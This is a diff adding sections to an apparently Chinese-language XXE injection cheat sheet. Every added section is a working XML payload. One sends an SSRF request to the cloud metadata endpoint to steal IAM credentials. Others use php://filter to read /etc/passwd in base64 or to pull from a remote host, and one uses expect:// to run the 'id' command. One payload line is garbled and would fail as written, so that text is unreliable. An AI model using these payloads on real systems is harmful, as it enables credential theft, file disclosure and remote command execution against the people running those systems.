@@ -65,3 +65,44 @@ SYSTEM 和 PUBLIC 可以互换，例如：
 <!-- /etc/ -->
 <?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root[<!ENTITY xxe SYSTEM "file:///etc/" >]><root><foo>&xxe;</foo></root>
 ```
+
+## 执行SSRF攻击
+
+```xml
+<?xml version="1.0" encoding="UTF-8"?>
+
+<!DOCTYPE foo [ <!ENTITY xxe SYSTEM
+ "http://169.254.169.254/latest/meta-data/iam/security-credentials/admin"> ]>
+```
+
+## PHP包装器
+
+### php://filter
+
+```xml
+<?xml version="1.0" encoding="UTF-8"?>
+
+<!DOCTYPE root [<!ENTITY xxe SYSTEM
+"php://filter/read=convert.base64-encode/resource=/etc/passwd">
+]>
+<stockCheck><productId>&xxe;</productId><storeId>1</storeId></stockCheck>
+```
+
+```xml
+<?xml version="1.0" encoding="UTF-8"?>
+
+<!DOCTYPE root [<!ENTITY xxe SYSTEM
+"php://filter为php://filter/convert.base64-encode/resource=http://远程主机地址">
+]>
+<stockCheck><productId>&xxe;</productId><storeId>1</storeId></stockCheck>
+```
+
+### expect://
+
+```XML
+<?xml version="1.0" encoding="utf-8"?>
+<!DOCTYPE root [
+<!ENTITY cmd SYSTEM "expect://id">
+]>
+<root>&cmd;</root>
+```
